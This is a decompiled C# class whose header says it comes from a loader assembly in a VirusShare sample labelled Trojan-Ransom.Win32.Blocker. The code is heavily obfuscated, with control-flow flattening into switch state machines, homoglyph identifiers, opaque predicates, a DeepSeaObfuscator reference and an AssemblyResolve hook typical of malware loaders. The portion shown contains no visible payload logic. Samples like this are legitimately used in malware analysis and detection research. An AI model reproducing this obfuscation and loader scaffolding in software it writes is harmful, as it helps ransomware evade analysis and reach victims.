// Decompiled with JetBrains decompiler
// Type: Ⴍ.ႷႰ
// Assembly: jizbwcwvchLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B60D9367-1A45-4565-96B0-53F2CD92A512
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.bdzb-39b748d8a4dd59a65e8a25c296dfc3aa1df8ddf8.exe

using Evaluation;
using System;
using System.IO;
using System.Runtime.InteropServices;

namespace Ⴍ
{
  internal sealed class ႷႰ : ApplicationException
  {
    public ႷႰ()
      : base(\u000E.Ⴓ(2088295860, 4, 4L, (byte) 24))
    {
      ႷႣ.Ⴓ();
    }

    static ႷႰ() => \u0006.Ⴀ();

    internal static Type Ⴐ()
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
      ႷႳ.Ⴀ(\u0006.ႭႭ(735, 'ɔ'), \u000E.Ⴓ(2088295576, 7, 12L, (byte) 19), (object) null, 354, 'ŋ');
label_4:
      int num = 1;
      while (true)
      {
        switch (num)
        {
          case 1:
            goto label_5;
          case 3:
          case 5:
            goto label_3;
          case 4:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႰ.Ⴐ);
            num = (int) ⴗ[82] * 3;
            continue;
        }
      }
label_5:
      return typeof (\u0002\u2000);
    }

    internal static long Ⴈ()
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
      \u0006.ႭႭ(709, 'ɉ').SetData(\u000E.Ⴓ(2088295583, 0, 6L, (byte) 30), (object) null);
      int num = 5;
      while (true)
      {
        switch (num)
        {
          case 2:
          case 4:
            goto label_3;
          case 5:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႰ.Ⴈ);
            num = (int) ⴗ[67];
            continue;
        }
      }
label_4:
      return 11;
    }

    internal static byte Ⴍ()
    {
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      int num1 = 3568 > 446 - 179 * 8 ? 6 : 2;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 5:
            goto label_6;
          case 1:
            goto label_3;
          case 2:
          case 4:
          case 7:
            num1 = (int) ⴍ[62] - 212;
            continue;
          case 6:
            int num2 = (int) ႷႰ.Ⴍ();
            num1 = 5;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႰ.Ⴍ);
            num1 = 1;
            continue;
        }
      }
label_6:
      return 9;
    }

    internal static byte Ⴅ()
    {
      byte[] ⴍ = \u0003\u2002.Ⴍ;
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
      \u0006.ႭႭ(113, 'ü').SetData(\u000E.Ⴓ(2088295580, 3, 9L, (byte) 15), (object) null);
label_4:
      int num = (int) ⴗ[34] - 176;
      while (true)
      {
        switch (num)
        {
          case 0:
            goto label_3;
          case 1:
            goto label_4;
          case 2:
          case 3:
            goto label_5;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႰ.Ⴅ);
            num = (int) ⴍ[11] - 20;
            continue;
        }
      }
label_5:
      return 23;
    }

    internal static Type Ⴓ()
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      int index = 0;
      object obj = (object) (byte[]) \u0003.Ⴐ(\u0006.ႭႭ(483, 'ŭ'), \u000E.Ⴓ(2088295579, 4, 11L, (byte) 2), 327, (short) 260);
      int num1 = (int) ⴗ[121] - 91;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 29:
            ++index;
            num1 = (int) ⴗ[35];
            continue;
          case 1:
            ++index;
            num1 = 30;
            continue;
          case 2:
            goto label_33;
          case 3:
            ++index;
            num1 = (int) ⴍ[507];
            continue;
          case 4:
            num1 = (obj as byte[])[index] < (byte) 8 ? 24 : 27;
            continue;
          case 6:
          case 27:
            num1 = (byte) 8 == ((byte[]) obj)[index] ? (int) ⴍ[7] : 32;
            continue;
          case 7:
            num1 = (byte) 29 == ((byte[]) obj)[index] ? 13 : (int) ⴗ[49] - (int) ⴗ[91];
            continue;
          case 8:
            goto label_9;
          case 9:
            \u0005\u2000.Ⴍ();
            goto case 3;
          case 10:
          case 23:
            num1 = ((byte[]) obj)[index] < (byte) 33 ? 31 : (int) ⴗ[145] - 110;
            continue;
          case 11:
            goto label_3;
          case 12:
            goto label_14;
          case 13:
            ++index;
            num1 = 17;
            continue;
          case 14:
            num1 = (byte) 33 == (obj as byte[])[index] ? 2 : 15;
            continue;
          case 15:
            \u000E.Ⴄ();
            num1 = 2;
            continue;
          case 16:
            ႷႳ.Ⴄ();
            num1 = 25;
            continue;
          case 17:
            num1 = (obj as byte[])[index] < (byte) 248 ? 21 : 34;
            continue;
          case 18:
            ႷႳ.Ⴐ();
            num1 = (int) ⴍ[573] - 40;
            continue;
          case 19:
            ႷႳ.Ⴃ();
            num1 = 13;
            continue;
          case 20:
            num1 = (obj as byte[])[index] < (byte) 218 ? 28 : 26;
            continue;
          case 21:
            goto label_19;
          case 22:
            num1 = (obj as byte[])[index] < (byte) 29 ? 12 : 7;
            continue;
          case 24:
            goto label_4;
          case 25:
            ++index;
            num1 = 23;
            continue;
          case 26:
            num1 = (byte) 218 == (obj as byte[])[index] ? 25 : (int) ⴍ[105];
            continue;
          case 28:
            goto label_24;
          case 30:
            num1 = (obj as byte[])[index] < (byte) 208 ? (int) ⴍ[264] - (int) ⴍ[360] : 33;
            continue;
          case 31:
            goto label_29;
          case 32:
            ႷႳ.Ⴃ();
            num1 = 1;
            continue;
          case 33:
            num1 = (byte) 208 == (obj as byte[])[index] ? 3 : (int) ⴍ[53];
            continue;
          case 34:
            num1 = (byte) 248 == ((byte[]) obj)[index] ? 29 : 18;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႰ.Ⴓ);
            num1 = (int) ⴗ[99] - 96;
            continue;
        }
      }
label_4:
      return typeof (\u0003\u2002);
label_9:
      return typeof (\u0005\u2000.ႷႷ.ႷႣ);
label_14:
      return typeof (ႷႨ);
label_19:
      return typeof (\u0002\u2002);
label_24:
      return typeof (ႷႭ);
label_29:
      return typeof (ႷႼ);
label_33:
      int num2 = index;
      Ⴍ.Ⴜ.Ⴗ[142] = (byte) ((int) Ⴍ.Ⴜ.Ⴗ[142] - (int) Ⴍ.Ⴜ.Ⴗ[126] & 121);
      int num3 = num2 + 1;
      return typeof (\u003CModule\u003E);
    }

    internal static object Ⴀ()
    {
      byte[] ⴍ = \u0003\u2002.Ⴍ;
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
      int index = 0;
      object obj = (object) (byte[]) \u0003.Ⴐ(\u0006.ႭႭ(398, 'ā'), \u000E.Ⴓ(2088295575, 8, 1L, (byte) 6), 205, (short) 137);
      int num1 = (int) ⴍ[123] + 36;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = (byte) 248 == ((byte[]) obj)[index] ? (int) ⴍ[514] - 183 : 13;
            continue;
          case 1:
            num1 = (byte) 29 == ((byte[]) obj)[index] ? (int) ⴍ[249] - 112 : 39;
            continue;
          case 2:
            num1 = (obj as byte[])[index] < (byte) 29 ? 3 : (int) ⴍ[7];
            continue;
          case 3:
            goto label_14;
          case 4:
            ++index;
            num1 = (int) ⴍ[118];
            continue;
          case 5:
            ++index;
            num1 = (int) ⴗ[116];
            continue;
          case 6:
            num1 = ((byte[]) obj)[index] < (byte) 208 ? 15 : 32;
            continue;
          case 7:
            num1 = (byte) 33 == (obj as byte[])[index] ? 4 : 9;
            continue;
          case 8:
            goto label_34;
          case 9:
            ႷႳ.Ⴄ();
            num1 = (int) ⴍ[404] - 66;
            continue;
          case 10:
          case 35:
            ++index;
            num1 = (int) ⴗ[18] - 216;
            continue;
          case 12:
            ++index;
            num1 = (int) ⴍ[112] / 2;
            continue;
          case 13:
            \u0006.Ⴐ();
            num1 = (int) ⴗ[79] - 182;
            continue;
          case 14:
          case 24:
            num1 = (byte) 218 == (obj as byte[])[index] ? (int) ⴗ[120] : 30;
            continue;
          case 15:
            goto label_9;
          case 16:
            num1 = (byte) 232 == (obj as byte[])[index] ? (int) ⴍ[117] - 153 : (int) ⴗ[28] - 141;
            continue;
          case 17:
            num1 = (obj as byte[])[index] < (byte) 33 ? 20 : 7;
            continue;
          case 18:
            goto label_19;
          case 19:
            ++index;
            num1 = 2;
            continue;
          case 20:
            goto label_29;
          case 21:
            goto label_24;
          case 22:
            \u0006.Ⴅ();
            goto case 19;
          case 23:
            ++index;
            num1 = 37;
            continue;
          case 25:
            goto label_4;
          case 26:
          case 37:
            num1 = ((byte[]) obj)[index] < (byte) 248 ? 18 : (int) ⴗ[38] - 82;
            continue;
          case 27:
            num1 = ((byte[]) obj)[index] < (byte) 232 ? 8 : 16;
            continue;
          case 28:
            num1 = ((byte[]) obj)[index] < (byte) 218 ? (int) ⴗ[72] * 3 : 14;
            continue;
          case 29:
            goto label_3;
          case 30:
            ႷႳ.Ⴐ();
            num1 = 10;
            continue;
          case 31:
            \u000E.Ⴄ();
            num1 = 12;
            continue;
          case 32:
            num1 = (byte) 208 == ((byte[]) obj)[index] ? 19 : (int) ⴍ[507];
            continue;
          case 33:
            num1 = (byte) 8 == (obj as byte[])[index] ? (int) ⴍ[112] : 31;
            continue;
          case 34:
            goto label_38;
          case 36:
            \u0006.Ⴐ();
            num1 = 34;
            continue;
          case 38:
            num1 = ((byte[]) obj)[index] < (byte) 8 ? (int) ⴍ[423] : 33;
            continue;
          case 39:
            ႷႣ.Ⴗ();
            num1 = 23;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႰ.Ⴀ);
            num1 = 29;
            continue;
        }
      }
label_4:
      return (object) null;
label_9:
      return (object) null;
label_14:
      return (object) null;
label_19:
      return (object) null;
label_24:
      return (object) null;
label_29:
      return (object) null;
label_34:
      return (object) null;
label_38:
      int num2 = index + 1;
      return (object) null;
    }

    internal static void Ⴄ()
    {
      byte[] ⴍ = \u0003\u2002.Ⴍ;
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      int index;
      object obj;
      switch (2)
      {
        case 0:
          obj = (object) (byte[]) \u0003.Ⴐ(\u0006.ႭႭ(207, '_'), \u000E.Ⴓ(2088295578, 5, 8L, (byte) 14), 705, (short) 644);
          goto case 3;
        case 1:
          break;
        case 3:
label_7:
          while ((obj as byte[])[index] >= (byte) 8)
          {
            int num1 = 2;
            while (true)
            {
              switch (num1)
              {
                case 0:
                case 5:
                  num1 = (byte) 208 == ((byte[]) obj)[index] ? 8 : 7;
                  continue;
                case 1:
                  goto label_4;
                case 2:
                  num1 = (byte) 8 == (obj as byte[])[index] ? 11 : 3;
                  continue;
                case 3:
                  ႷႰ.Ⴐ();
                  num1 = 11;
                  continue;
                case 4:
                  goto label_20;
                case 6:
                  num1 = (byte) 29 == (obj as byte[])[index] ? 4 : 17;
                  continue;
                case 7:
                  \u0003.Ⴄ();
                  num1 = 8;
                  continue;
                case 8:
                case 15:
                  ++index;
                  num1 = 14;
                  continue;
                case 9:
                  goto label_23;
                case 10:
                  goto label_7;
                case 11:
                  ++index;
                  num1 = (int) ⴍ[231] - 99;
                  continue;
                case 13:
                  num1 = ((byte[]) obj)[index] < (byte) 208 ? (int) ⴗ[82] : (int) ⴗ[150] - (int) ⴗ[150];
                  continue;
                case 14:
                  num1 = (obj as byte[])[index] < (byte) 29 ? (int) ⴍ[105] : (int) ⴗ[111] - 133;
                  continue;
                case 16:
                  goto label_12;
                case 17:
                  int num2 = (int) ႷႰ.Ⴅ();
                  num1 = 4;
                  continue;
                default:
                  goto label_6;
              }
            }
label_4:
            break;
label_23:
            break;
label_12:
            break;
label_6:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႰ.Ⴄ);
            break;
label_20:
            int num3 = index + 1;
            break;
          }
          break;
        case 4:
          break;
        default:
          index = 0;
          goto case 0;
      }
    }

    internal static Type Ⴗ()
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      int index = 0;
      object obj = (object) (byte[]) \u0003.Ⴐ(\u0006.ႭႭ(576, 'ˑ'), \u000E.Ⴓ(2088295576, 7, 11L, (byte) 20), 756, (short) 690);
      int num1 = (int) ⴗ[6] - 16;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = (byte) 208 == (obj as byte[])[index] ? (int) ⴗ[170] - 164 : 8;
            continue;
          case 1:
            num1 = ((byte[]) obj)[index] < (byte) 33 ? 5 : 25;
            continue;
          case 2:
            num1 = (byte) 106 == (obj as byte[])[index] ? 10 : 38;
            continue;
          case 3:
            num1 = (byte) 248 == (obj as byte[])[index] ? 36 : 31;
            continue;
          case 4:
            num1 = (byte) 29 == (obj as byte[])[index] ? (int) ⴗ[104] - 15 : (int) ⴗ[10] - (int) ⴗ[6];
            continue;
          case 5:
            goto label_30;
          case 6:
            num1 = (obj as byte[])[index] < (byte) 208 ? (int) ⴗ[57] - (int) ⴗ[64] : 0;
            continue;
          case 7:
            goto label_20;
          case 8:
            ႷႰ.Ⴈ();
            num1 = (int) ⴗ[40] - 138;
            continue;
          case 9:
            int num2 = (int) ႷႰ.Ⴅ();
            num1 = (int) ⴗ[160] - 169;
            continue;
          case 10:
            goto label_44;
          case 11:
            \u0005\u2000.Ⴍ();
            goto case 26;
          case 12:
            \u0006.Ⴐ();
            num1 = (int) ⴗ[116];
            continue;
          case 13:
          case 30:
            num1 = (byte) 8 == (obj as byte[])[index] ? 28 : 12;
            continue;
          case 14:
            goto label_10;
          case 15:
            num1 = (byte) 218 == (obj as byte[])[index] ? 21 : 43;
            continue;
          case 16:
            num1 = ((byte[]) obj)[index] < (byte) 232 ? (int) ⴗ[43] : 19;
            continue;
          case 17:
            num1 = ((byte[]) obj)[index] < (byte) 218 ? 29 : (int) ⴍ[517] - 55;
            continue;
          case 18:
            num1 = ((byte[]) obj)[index] < (byte) 106 ? (int) ⴗ[11] / 5 : 2;
            continue;
          case 19:
            num1 = (byte) 232 == (obj as byte[])[index] ? (int) ⴍ[541] - 134 : (int) ⴍ[369];
            continue;
          case 20:
            num1 = ((byte[]) obj)[index] < (byte) 248 ? 7 : 3;
            continue;
          case 21:
            ++index;
            num1 = 1;
            continue;
          case 22:
            goto label_40;
          case 23:
            num1 = ((byte[]) obj)[index] < (byte) 8 ? 37 : (int) ⴗ[4];
            continue;
          case 24:
            num1 = (obj as byte[])[index] < (byte) 29 ? (int) ⴍ[312] - 169 : 4;
            continue;
          case 25:
            num1 = (byte) 33 == (obj as byte[])[index] ? (int) ⴗ[57] - (int) ⴗ[166] : (int) ⴗ[134] - 175;
            continue;
          case 26:
            ++index;
            num1 = (int) ⴗ[92] - 98;
            continue;
          case 27:
          case 31:
            ႷႳ.Ⴄ();
            num1 = (int) ⴍ[384] - 49;
            continue;
          case 28:
            ++index;
            goto case 35;
          case 29:
            goto label_25;
          case 32:
            goto label_35;
          case 33:
            ++index;
            num1 = 16;
            continue;
          case 34:
            ++index;
            num1 = 20;
            continue;
          case 35:
            num1 = 6;
            continue;
          case 36:
            ++index;
            num1 = (int) ⴍ[91];
            continue;
          case 37:
            goto label_4;
          case 38:
            ႷႰ.Ⴐ();
            num1 = 10;
            continue;
          case 40:
            ++index;
            num1 = 24;
            continue;
          case 41:
            ႷႰ.Ⴐ();
            num1 = (int) ⴍ[215] - 85;
            continue;
          case 42:
            goto label_3;
          case 43:
            ႷႳ.Ⴄ();
            num1 = 21;
            continue;
          case 44:
            goto label_15;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႰ.Ⴗ);
            num1 = 42;
            continue;
        }
      }
label_4:
      return typeof (\u000E);
label_10:
      return typeof (ႷႼ);
label_15:
      return typeof (DeepSeaObfuscator);
label_20:
      return typeof (ႷႷ.ႷႭ);
label_25:
      return typeof (ႷႭ);
label_30:
      return typeof (\u0005\u2000);
label_35:
      return typeof (\u0002\u2002);
label_40:
      return typeof (ႷႷ.ႷႭ);
label_44:
      int num3 = index + 1;
      return typeof (ႷႥ);
    }

    internal static int Ⴃ()
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      int index = 0;
      object obj = (object) (byte[]) \u0003.Ⴐ(\u0006.ႭႭ(714, 'ɘ'), \u000E.Ⴓ(2088295583, 0, 2L, (byte) 28), 42, (short) 109);
      int num1 = 18;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = (obj as byte[])[index] < (byte) 29 ? 5 : (int) ⴗ[147] - (int) ⴗ[116];
            continue;
          case 1:
          case 13:
            goto label_33;
          case 3:
            \u0006.Ⴐ();
            num1 = 29;
            continue;
          case 4:
            \u0003.Ⴀ();
            num1 = 13;
            continue;
          case 5:
            goto label_14;
          case 6:
            ++index;
            num1 = 27;
            continue;
          case 7:
            ႷႳ.Ⴃ();
            num1 = 6;
            continue;
          case 8:
            num1 = (byte) 208 == ((byte[]) obj)[index] ? 29 : 3;
            continue;
          case 9:
            num1 = (byte) 218 == (obj as byte[])[index] ? (int) ⴍ[(int) sbyte.MaxValue] / 6 : (int) ⴗ[76] - (int) ⴗ[79];
            continue;
          case 10:
            int num2 = (int) ႷႰ.Ⴍ();
            num1 = (int) ⴗ[72] * 2;
            continue;
          case 11:
            num1 = (byte) 8 == ((byte[]) obj)[index] ? 32 : 31;
            continue;
          case 12:
          case 32:
            ++index;
            num1 = 22;
            continue;
          case 14:
            ++index;
            num1 = 17;
            continue;
          case 15:
            goto label_19;
          case 16:
            num1 = (byte) 29 == ((byte[]) obj)[index] ? (int) ⴗ[5] - 153 : (int) ⴗ[120];
            continue;
          case 17:
            num1 = (obj as byte[])[index] < (byte) 248 ? (int) ⴗ[116] - 13 : 23;
            continue;
          case 18:
            num1 = ((byte[]) obj)[index] < (byte) 8 ? (int) ⴗ[76] - (int) ⴗ[149] : 11;
            continue;
          case 19:
            num1 = (obj as byte[])[index] < (byte) 33 ? (int) ⴗ[116] : 26;
            continue;
          case 20:
          case 27:
            num1 = ((byte[]) obj)[index] < (byte) 218 ? (int) ⴍ[515] - 95 : (int) ⴗ[5] - (int) ⴗ[22];
            continue;
          case 21:
            goto label_9;
          case 22:
            num1 = (obj as byte[])[index] < (byte) 208 ? (int) ⴍ[107] : (int) ⴗ[48];
            continue;
          case 23:
            num1 = (byte) 248 == (obj as byte[])[index] ? 6 : 7;
            continue;
          case 24:
            goto label_4;
          case 25:
            goto label_3;
          case 26:
            num1 = (byte) 33 == (obj as byte[])[index] ? 13 : (int) ⴗ[120] - 6;
            continue;
          case 28:
            goto label_29;
          case 29:
            ++index;
            num1 = 0;
            continue;
          case 30:
            goto label_24;
          case 31:
            \u0006.Ⴅ();
            goto case 12;
          case 33:
            \u0005\u2000.Ⴍ();
            goto case 34;
          case 34:
            ++index;
            num1 = (int) ⴗ[121] / 5;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႰ.Ⴃ);
            num1 = 25;
            continue;
        }
      }
label_4:
      return 13;
label_9:
      return 15;
label_14:
      return 6;
label_19:
      return 2;
label_24:
      return 6;
label_29:
      return 12;
label_33:
      int num3 = index + 1;
      return 2;
    }

    internal static void Ⴜ()
    {
      byte[] ⴍ = \u0003\u2002.Ⴍ;
      int index;
      Array array;
      switch (0)
      {
        case 1:
          array = (Array) \u0003.Ⴐ(\u0006.ႭႭ(525, 'ʞ'), \u000E.Ⴓ(2088295580, 3, 8L, (byte) 30), 684, (short) 740);
          goto case 3;
        case 2:
          break;
        case 3:
label_7:
          while ((array as byte[])[index] >= (byte) 8)
          {
            int num1 = 2;
            while (true)
            {
              switch (num1)
              {
                case 0:
                case 2:
                case 7:
                  num1 = (byte) 8 == (array as byte[])[index] ? (int) ⴍ[341] - 84 : (int) ⴍ[131] - (int) ⴍ[305];
                  continue;
                case 1:
                  int num2 = (int) ႷႰ.Ⴅ();
                  num1 = 6;
                  continue;
                case 4:
                  goto label_7;
                case 5:
                  goto label_4;
                case 6:
                  goto label_11;
                default:
                  goto label_6;
              }
            }
label_4:
            break;
label_6:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႰ.Ⴜ);
            break;
label_11:
            int num3 = index + 1;
            break;
          }
          break;
        case 4:
          break;
        default:
          index = 0;
          goto case 1;
      }
    }

    internal static uint ႭႥ([In] uint obj0, [In] uint obj1, [In] char obj2, [In] short obj3)
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴗ[130] - (int) ⴗ[34];
      uint num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_15;
          case 1:
            num2 = 11;
            continue;
          case 2:
          case 9:
            num2 = (int) ⴗ[150] - 114;
            continue;
          case 3:
          case 7:
            num3 = Math.Max(obj0, obj1);
            num2 = 11;
            continue;
          case 4:
            goto label_3;
          case 5:
            int num4;
            switch (((int) obj2 ^ (int) obj3) - 110 ^ num1)
            {
              case 0:
                num4 = 6;
                break;
              case 1:
                num4 = 7;
                break;
              default:
                num4 = (int) ⴗ[120];
                break;
            }
            num2 = num4;
            continue;
          case 6:
            num3 = Math.Min(obj0, obj1);
            goto case 1;
          case 10:
            num3 = obj1;
            num2 = 11;
            continue;
          case 11:
            ++num1;
            int num5 = (int) obj2;
            num2 = (num5 * num5 + (int) obj2) % 2 == 0 ? 0 : (int) ⴍ[53];
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႰ.ႭႥ);
            num2 = 4;
            continue;
        }
      }
label_15:
      return num3;
    }

    internal static long ႭႭ([In] Stream obj0, [In] long obj1, [In] SeekOrigin obj2, [In] short obj3, [In] char obj4)
    {
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      int num1 = 0;
      int num2 = 1;
      long num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 1:
          case 3:
            num3 = obj0.Seek(obj1, obj2);
            ++num1;
            goto case 7;
          case 4:
            goto label_7;
          case 5:
          case 6:
            num2 = 126 < 504 / 4 - 79 ? (int) ⴍ[7] : (int) ⴍ[146];
            continue;
          case 7:
            num2 = (int) ⴍ[408] - 98;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႰ.ႭႭ);
            num2 = 0;
            continue;
        }
      }
label_7:
      return num3;
    }

    internal static string[] ႭႨ([In] string obj0, [In] char[] obj1, [In] short obj2, [In] int obj3)
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
      int num1 = 0;
      int num2 = 5;
      Array array;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
          case 7:
            goto label_8;
          case 1:
            num2 = (int) ⴗ[111] - 134;
            continue;
          case 3:
            int num3 = (int) obj2;
            num2 = (num3 * num3 + (int) obj2) % 2 == 0 ? 0 : 1;
            continue;
          case 5:
            array = (Array) obj0.Split(obj1);
            ++num1;
            goto case 8;
          case 6:
            goto label_3;
          case 8:
            num2 = 3;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႰ.ႭႨ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return array as string[];
    }

    internal static void ႭႣ([In] AppDomain obj0, [In] ResolveEventHandler obj1, [In] short obj2, [In] int obj3)
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
      int num1 = 0;
      int num2;
      int num3;
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_5;
          case 2:
          case 4:
          case 5:
            obj0.AssemblyResolve += obj1;
            ++num2;
            int num4 = (int) obj2;
            num3 = num4 * num4;
            num1 = 3;
            continue;
          case 3:
          case 6:
            num3 = (int) obj2 + num3;
            num1 = num3 % 2 != 0 ? 5 : 1;
            continue;
          default:
            num2 = 0;
            num1 = (int) ⴗ[120] / 2;
            continue;
        }
      }
label_5:;
    }
  }
}
